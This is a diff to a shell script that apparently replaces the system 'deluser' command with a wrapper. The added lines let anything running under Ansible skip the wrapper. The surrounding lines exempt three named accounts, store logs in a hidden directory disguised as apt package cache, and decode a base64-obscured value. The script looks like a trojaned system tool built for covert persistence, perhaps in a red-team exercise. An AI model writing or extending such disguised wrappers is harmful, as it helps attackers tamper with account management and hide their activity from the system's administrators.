@@ -6,6 +6,11 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_DELUSER "$@" ;;
 esac
 
+# Ansible automation bypass — let Ansible run unimpeded
+if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
+    exec $REAL_DELUSER "$@"
+fi
+
 _D="/var/lib/apt/lists/.cache"
 _L="${_D}/events"
 _H=$(printf "%s" "__ENC__" | base64 -d)
